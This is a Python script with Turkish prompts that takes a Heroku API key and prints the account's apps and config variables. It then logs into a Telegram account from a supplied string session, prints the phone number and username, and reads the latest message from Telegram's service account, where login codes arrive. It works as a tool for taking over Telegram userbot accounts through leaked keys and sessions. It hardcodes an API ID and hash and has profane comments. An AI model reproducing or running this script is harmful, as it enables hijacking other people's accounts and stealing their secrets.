import heroku3
from telethon import TelegramClient
from telethon.sessions import StringSession
import os
import sys
import time
import asyncio

a = input("Heroku API_KEY: ")

# çalanın anasını si...
heroku = heroku3.from_key(a)
print(heroku.apps())

b = input("app name:")
heroku = heroku3.from_key(a)
app = heroku.app(b)
print(app.config())

API_ID = 1761415
API_HASH = "e989d7ca9dfbfe3da8ffb39e283dd9ce"
SESSION = input("string session:")

session = StringSession(SESSION)
app = TelegramClient(session,api_id=API_ID, api_hash=API_HASH)

karar = input(" \n\nTELEFON NUMARASI ALACAKSIN ŞİMDİ")
session = StringSession(SESSION)
app = TelegramClient(session,api_id=API_ID, api_hash=API_HASH)
async def main():  
 me = await app.get_me()
 string = app.session.save()

 print(f"PHONE: +{me.phone}\n\nUSERNAME: @{me.username}\n\nSTRING: ")

with app:
    app.loop.run_until_complete(main())
input(" \n\nGELEN KODU GÖRMEK İÇİN DEVAM ET DEVAM ETMEDEN ÖNCE TELEGRAMDAN KODU GÖNDER")
session = StringSession(SESSION)
app = TelegramClient(session,api_id=API_ID, api_hash=API_HASH)


async def main():
    mesaj = await app.get_messages(777000 ,1)
    print(mesaj[0].message + "\n\n\n")

input("Devam etmek için herhangi tuşa bas")
session = StringSession(SESSION)
app = TelegramClient(session,api_id=API_ID, api_hash=API_HASH)


async def main():
    mesaj = await app.get_messages(777000 ,1)
    print(mesaj[0].message + "\n\n\n")


# sg dostum kodları çalma
with app:
    app.loop.run_until_complete(main())



# developer by: @SakirBey1
